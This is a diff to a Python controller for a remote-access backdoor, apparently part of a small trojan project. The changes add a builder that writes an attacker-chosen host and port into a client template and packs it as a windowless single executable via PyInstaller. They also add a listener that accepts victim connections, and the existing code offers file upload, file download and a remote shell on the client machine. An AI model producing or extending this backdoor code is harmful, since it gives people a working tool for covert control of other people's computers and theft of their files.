@@ -4,6 +4,8 @@
 import socket
 import os
 import struct
+import shutil
+import re
 
 
 
@@ -17,11 +19,9 @@ import struct
 
 
 
-class Server(): #class Server: define the client properties
+class Server(): #class Server: define the server properties
     def __init__(self, client = None):
         self.client = client
-        self.HOST = "127.0.0.1"
-        self.PORT = 51025
 
     def send(self, data): #custom send function
         pkt = struct.pack('>I', len(data)) + data
@@ -45,24 +45,54 @@ class Server(): #class Server: define the client properties
 
 
 def main_menu(): #define the main menu
+    while True:
+        os.system('cls')
+        print("""
+        1. Configure the client file
+        2. Listen to a port and remote a backdoor
+        3. Exit
+        """)
+        choice = input("\n Enter your choice: ")
+        if int(choice) == 1:
+            configure()
+        if int(choice) == 2:
+            listener()
+        elif int(choice) == 3:
+            exit()
+
+
+def configure(): #configure the client with ip and port
     os.system('cls')
-    print("""
-    1. Listen to a port and remote a backdoor
-    2. Exit
-    """)
-    choice = input("\n Enter your choice: ")
-    if int(choice) == 1:
-        listener()
-    elif int(choice) == 2:
-        exit()
+    HOST = input("Enter the host/ip of the client: ")
+    PORT = input("Enter the port of the client: ")
+    exe = input("Do you want to create an executable (y/n): ")
+    with open('data/client.txt', 'r') as file:
+        content = file.readlines()
+    content[content.index("HOST = '127.0.0.1'\n")] = f"HOST = '{HOST}'\n"
+    content[content.index("PORT = 51025\n")] = f"PORT = {PORT}\n"
+    with open('client.py', 'w') as file:
+        file.write(''.join(content))
+    if exe == 'y':
+        os.system('cls')
+        print('Creating the executable... This may take a while.')
+        os.system("pyinstaller --clean -w -F --distpath exe --log-level WARN client.py")
+        os.remove('client.spec')
+        os.remove('client.py')
+        shutil.rmtree('build')
+        print("Executable file succesfully created in folder 'exe'!\n")
+    else:
+        print("Python file succesfully created!\n")
+    os.system('pause')
 
 
 def listener(): #define the socket and listen for connections
+    HOST = input("Enter your host/ip: ")
+    PORT = int(input("Enter your port: "))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.bind((Server().HOST, Server().PORT))
+    sock.bind((HOST, PORT))
     sock.listen(1)
-    print("\nServer is listening...")
+    print(f"\nServer {HOST} is listening on port {PORT}...")
     while True:
         client, address = sock.accept()
         global server
@@ -117,7 +147,6 @@ def upload(): #upload command: upload a file to the client
         print('File sent succesful!')
     except FileNotFoundError:
         print("File not found!")
-    os.system('pause')
 
 
 def download(): #download command: download a file from the client
@@ -129,7 +158,6 @@ def download(): #download command: download a file from the client
     with open(file_name, 'wb') as file:
         file.write(file_content)
     print("File received succesful!")
-    os.system('pause')
 
 
 def cmd(): #cmd command: open a shell on the client machine
